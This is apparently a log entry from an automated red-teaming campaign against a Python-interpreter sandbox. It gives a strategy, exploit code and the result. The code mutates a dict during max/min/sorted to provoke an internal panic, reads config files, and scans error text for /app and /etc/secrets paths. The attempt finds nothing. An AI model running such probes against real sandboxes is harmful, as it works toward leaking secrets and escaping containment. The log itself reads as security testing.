# Attempt 025 — 2026-06-03T22:02:41.103730+00:00
## Template: D | Score: 0
## Strategy
Create a dict with 50+ keys containing path-like strings, then use max() with a key function that mutates dict values during iteration (same-size mutation bypasses checks_mutation). The corrupted iterator state should trigger a Rust panic with detailed traceback when the sort completes with inconsistent data. Capture and print the full exception to extract any /app/ or /etc/secrets/ path fragments from the internal error context.

## Exploit code
```python
from pathlib import Path

# Create dict with path-like keys for potential leakage
d = {f'path_{i:03d}': f'/data/sample_{i}' for i in range(60)}

mutations = []
errors = []

def evil_key(k):
    """Key function that mutates dict during iteration (same-size)"""
    try:
        old = d.get('path_000', '')
        d['path_000'] = old[-10:] + old[:-10] if len(old) > 10 else old
        mutations.append(k)
        
        if len(mutations) > 20:
            d[f'path_{len(mutations):03d}'] = 'X' * 20
    except:
        pass
    
    return len(k)

try:
    result = max(d, key=evil_key)
    print(f"Max result: {result}")
except Exception as e:
    print(f"Max exception: {type(e).__name__}")
    print(f"Error: {str(e)[:200]}")
    errors.append(str(e))

try:
    result2 = min(d, key=evil_key)
    print(f"Min result: {result2}")
except Exception as e:
    print(f"Min exception: {type(e).__name__}: {str(e)[:150]}")
    errors.append(str(e))

print(f"Dict size: {len(d)}")
print(f"Mutations: {len(mutations)}")

# Try sorted() which has more complex iteration
try:
    sorted_result = sorted(d, key=evil_key)
    print(f"Sorted len: {len(sorted_result)}")
except Exception as e:
    print(f"Sorted exception: {type(e).__name__}: {str(e)[:150]}")
    errors.append(str(e))

# Check for path leaks in config files
for p in ['/data/config.json', '/data/current-config.json']:
    try:
        content = Path(p).read_text()[:300]
        print(f"Config: {content[:150]}")
    except:
        pass

# Print errors that might contain internal paths
for err in errors:
    if '/app' in err or '/etc' in err or '/secret' in err:
        print(f"PATH LEAK: {err}")
```

## Result
Category: no_findings
Details: Completed with no notable findings
```
Success: True
Elapsed: 304ms
Resumes: 0
Snapshots: 0
Print: Max result: path_000
Min exception: RuntimeError: dictionary changed size during iteration
Dict size: 62
Mutations: 61
Sorted len: 62
Config: {
  "app_name": "hackmonty",
  "version": "0.1.0",
  "debug": false,
  "max_workers": 4
}

Config: {
  "app_name": "hackmonty",
  "version": "0.1.0",
  "debug": false,
  "max_workers": 4
}


```

## Analysis
- Completed with no findings
- **Verdict**: Try different template
